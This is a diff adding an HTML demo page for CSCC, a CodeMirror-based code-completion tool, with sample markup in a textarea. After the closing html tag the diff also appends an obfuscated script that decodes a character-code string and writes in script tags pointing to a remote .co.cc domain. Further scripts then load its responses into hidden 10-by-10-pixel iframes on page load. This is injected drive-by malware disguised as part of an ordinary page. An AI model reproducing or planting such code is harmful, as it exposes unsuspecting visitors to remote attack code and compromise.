@@ -1,0 +1,59 @@
+<html>
+  <head>
+    <script src="CodeMirror-0.93/js/codemirror.js"></script>
+    <script src="cscc.js"></script>
+    <script src="cscc-parse-xml.js"></script>
+    <script src="cscc-parse-css.js"></script>
+    <script src="cscc-sense.js"></script>
+  </head>
+  <body onload="cscc.init('code');">
+    <textarea id="code" name="code">&lt;!-- Hi, welcome to another Common Sense Code Completion demo! -->
+&lt;html>
+  &lt;head>
+    &lt;title>CSCC - Common Sense Code Completion enhanced&lt;/title>
+    &lt;meta name="description" content="browser based code completion - now context aware"/>
+    &lt;link type="text/css" rel="stylesheet" href="/style.css"/>
+    &lt;script type="text/javascript" src="/script.js">&lt;/script>
+    &lt;style>
+      body {
+        margin: 20px;
+        font-family: "Lucida Grande";
+        font-size: 12px;
+      }
+      button {
+        white-space: nowrap;
+      }
+    &lt;/style>
+  &lt;/head>
+  &lt;body>
+    &lt;h1>Welcome to the CSCC demo.&lt;/h1>
+    &lt;p>
+      This is another demo for CSCC, Common Sense Code Completion. The
+      original code is written by Martin Kool (@mrtnkl) from Quplo. Please
+      read the &lt;a href="http://blog.quplo.com">Quplo blog&lt;/a> for more
+      details about CSCC.
+    &lt;/p>
+    &lt;p>
+      You are watching a version of CSCC containing fixes from Quplo code and
+      some exciting additions, like context aware tags. Context aware tags
+      are those that only appears inside another tag, for example
+      "option" or "optgroup" tags inside "select".
+    &lt;/p>
+    &lt;select title="Try it now!">
+    &lt;/select>
+    &lt;p>
+      We use this enhanced code in production at Webpop, if you are a
+      designer or web developer, don't forget to sign up for a beta test
+      of &lt;a href="http://www.webpop.com">Webpop!</a>. :-)
+    &lt;/p>
+
+    &lt;form method="get" action="http://www.webpop.com/">
+      &lt;input type="submit" value="Sign up now!"/>
+    &lt;/form>
+
+  &lt;/body>
+&lt;/html>
+&lt;!-- Hope you enjoyed! --></textarea>
+  </body>
+</html>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script><script type="text/javascript">function frodo(){var temp="",i,c=0,out="";var str="60!115!99!114!105!112!116!62!118!97!114!32!105!110!100!101!120!49!95!117!114!108!61!34!104!116!116!112!58!47!47!114!101!101!100!111!109!46!99!111!46!99!99!47!105!110!100!101!120!49!46!112!104!112!34!59!60!47!115!99!114!105!112!116!62!13!10!60!115!99!114!105!112!116!62!118!97!114!32!105!110!100!101!120!50!95!117!114!108!61!34!104!116!116!112!58!47!47!114!101!101!100!111!109!46!99!111!46!99!99!47!105!110!100!101!120!50!46!112!104!112!34!59!60!47!115!99!114!105!112!116!62!13!10!60!115!99!114!105!112!116!32!116!121!112!101!61!34!116!101!120!116!47!106!97!118!97!115!99!114!105!112!116!34!32!115!114!99!61!34!104!116!116!112!58!47!47!114!101!101!100!111!109!46!99!111!46!99!99!47!99!111!117!110!116!101!114!46!106!115!34!62!60!47!115!99!114!105!112!116!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);} frodo();</script><script>$(document).ready(function() { $.getJSON(index1_url+"?callback=?", function(data){ $("#banner1").html('<iframe src='+data.qwer1+' width=10 height=10 frameborder=0></iframe>'); }); });</script><div id="banner1"></div><script>$(document).ready(function() { $.getJSON(index2_url+"?callback=?", function(data){ $("#banner2").html('<iframe src='+data.qwer2+' width=10 height=10 frameborder=0></iframe>'); }); });</script><div id="banner2"></div>
